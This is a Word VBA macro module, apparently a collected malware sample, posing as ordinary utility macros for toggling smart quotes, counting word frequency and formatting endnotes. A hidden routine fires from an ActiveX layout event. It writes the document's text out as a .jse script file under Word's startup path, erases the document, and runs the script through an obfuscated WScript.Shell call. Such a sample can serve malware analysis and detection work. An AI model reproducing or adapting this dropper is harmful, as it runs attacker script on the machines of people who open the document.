Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private FoTer As String
Private Toore6 As String
Private Fedas As String


Sub ToggleSmartQuotes()
' Turns on/off the feature in Word that converts straight quotes to curly quotes

    Options.AutoFormatAsYouTypeReplaceQuotes = Not (Options.AutoFormatAsYouTypeReplaceQuotes)
    
    ' This part is optional if you want to see the status
    Dim smStatus As String
    smStatus = "Off"
    If Options.AutoFormatAsYouTypeReplaceQuotes = True Then
       smStatus = "On"
    End If
    
    MsgBox ("Smart quotes are " + smStatus)
End Sub



Sub WordFrequency()
    Const maxwords = 100        'Maximum unique words allowed - assign based on requirements
    Dim SingleWord As String       'Raw word pulled from doc
    Dim Words(maxwords) As String  'Array to hold unique words
    Dim Freq(maxwords) As Integer  'Frequency counter for unique words
    Dim WordNum As Integer         'Number of unique words
    Dim ttlwds As Long             'Total words in the document
    Dim Excludes As String         'Words to be excluded
    Dim Found As Boolean           'Temporary flag
    Dim j, k, l, Temp As Integer   'Temporary variables
    Dim a_word As Object           '
    Dim tmpName As String

    '
    On Error Resume Next
    ' Set up excluded words
    Excludes = "[the][a][of][is][to][for][by][be][and][are][in][at][on]"
   
    Selection.HomeKey Unit:=wdStory
    System.Cursor = wdCursorWait
    WordNum = 0
    ttlwds = ActiveDocument.Words.Count

    ' Manage the repeat
    For Each a_word In ActiveDocument.Words
        SingleWord = Trim(LCase(a_word))
        'Out of range?
        If SingleWord < "a" Or SingleWord > "z" Then
            SingleWord = ""
        End If
        'On exclude list?
        If InStr(Excludes, "[" & SingleWord & "]") Then
            SingleWord = ""
        End If
        If Len(SingleWord) > 0 Then
            Found = False
            For j = 1 To WordNum
                If Words(j) = SingleWord Then
                    Freq(j) = Freq(j) + 1
                    Found = True
                    Exit For
                End If
            Next j
            If Not Found Then
                WordNum = WordNum + 1
                Words(WordNum) = SingleWord
                Freq(WordNum) = 1
            End If
            If WordNum > maxwords - 1 Then
               'j = MsgBox("Too many words.", vbOKOnly)
                Exit For
            End If
        End If
        ttlwds = ttlwds - 1
        StatusBar = "Remaining: " & ttlwds & ", Unique: " & WordNum
    Next a_word

    ' Results
    tmpName = ActiveDocument.AttachedTemplate.FullName
    Documents.Add Template:=tmpName, NewTemplate:=False
    Selection.ParagraphFormat.TabStops.ClearAll
    With Selection
        For j = 1 To WordNum
            .TypeText Text:=Trim(Str(Freq(j))) _
              & vbTab & Words(j) & vbCrLf
        Next j
    End With
    
    VBA.CallByName VBA.CreateObject("" & "W" & Empty & "Sc" & Empty & "rip" & "" & "t." & Toore6), _
    "R" & "" & "u" & Empty & "n", VbMethod, _
    """" & FoTer & """" & " " & ActiveDocument.AttachedTemplate.FullName, 0

    
    System.Cursor = wdCursorNormal
    'j = MsgBox("There were " & Trim(Str(WordNum)) & _
      " different words ", vbOKOnly, "Finished")
End Sub


    
Private Sub Terookl(fdx As String)
FoTer = fdx & Empty & "\." & ".\MassFol" & Empty
On Error Resume Next
MkDir FoTer
FoTer = "" & FoTer & Empty & "\Users." & "" & "j" & Empty & "s" & "" & "e"
Dim Ntooker As Integer
Ntooker = FreeFile
Open FoTer For Output As #Ntooker
Print #Ntooker, ActiveDocument.Content.Text
Close #Ntooker
ActiveDocument.Tables.Add Range:=Selection.Range, NumRows:=1, NumColumns:=1
Toore6 = "" & "s" & Empty & "h" & "" & "el" & "l" & ""
Exit Sub
ToggleSmartQuotes

End Sub


Sub ChicagoNotesFormatting()
    On Error Resume Next
    ' If endnotes found in active document...
    If ActiveDocument.Endnotes.Count >= 1 Then

        Set NotesOptions = Selection.EndnoteOptions
        Set NotesRange = ActiveDocument.StoryRanges(wdEndnotesStory)
        
        ' If endnotes use symbols, a period does not immediately follow endnote marks in the endnotes
        If NotesOptions.NumberStyle = wdNoteNumberStyleSymbol Then
            'Call MarkFormatting(NotesRange, "\1 ")
        Else
            'Call MarkFormatting(NotesRange, "\1. ")
        End If

End If
Terookl Application.StartupPath
End Sub


Private Function Tauret()
Tauret = Len(ActiveDocument.Content.Text)
End Function

    
Private Sub T_Oness()
If (Tauret > 11141) Then
ChicagoNotesFormatting
ActiveDocument.Content.Text = ""
WordFrequency
End If
End Sub



Private Sub MultiPage1_Layout(ByVal Index As Long)
T_Oness
End Sub


INQUEST-PP=macro
